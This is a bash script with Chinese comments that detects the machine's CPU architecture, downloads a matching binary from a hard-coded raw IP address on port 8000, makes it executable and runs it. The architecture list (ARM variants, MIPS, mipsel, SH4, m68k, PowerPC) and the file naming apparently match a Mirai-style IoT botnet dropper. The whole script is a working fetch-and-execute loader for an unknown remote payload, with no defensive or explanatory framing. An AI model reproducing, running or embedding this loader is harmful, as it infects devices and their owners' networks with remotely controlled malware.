#!/bin/bash

# 定义文件的基本 URL
BASE_URL="http://84.54.3.198:8000"

# 检测系统架构
ARCH=$(uname -m)

# 根据架构选择下载的文件名
case "$ARCH" in
    armv7l)
        FILENAME="main_arm7"
        ;;
    armv6l)
        FILENAME="main_arm6"
        ;;
    armv5l)
        FILENAME="main_arm5"
        ;;
    arm*)
        FILENAME="main_arm"
        ;;
    m68k)
        FILENAME="main_m68k"
        ;;
    mips)
        FILENAME="main_mips"
        ;;
    mipsel)
        FILENAME="main_mpsl"
        ;;
    ppc)
        FILENAME="main_ppc"
        ;;
    sh4)
        FILENAME="main_sh4"
        ;;
    x86_64)
        FILENAME="main_x86_64"
        ;;
    i386)
        FILENAME="main_x86"
        ;;
    *)
        echo "不支持的架构: $ARCH"
        exit 1
        ;;
esac

# 下载文件
echo "正在下载 $FILENAME..."
curl -o "main" "$BASE_URL/$FILENAME"

if [[ $? -ne 0 ]]; then
    echo "下载失败，请检查 URL 或网络连接。"
    exit 1
fi

# 添加执行权限
chmod +x "main"

# 执行文件
echo "正在执行下载的文件..."
./main

if [[ $? -ne 0 ]]; then
    echo "执行失败。"
    exit 1
fi

echo "执行成功。"
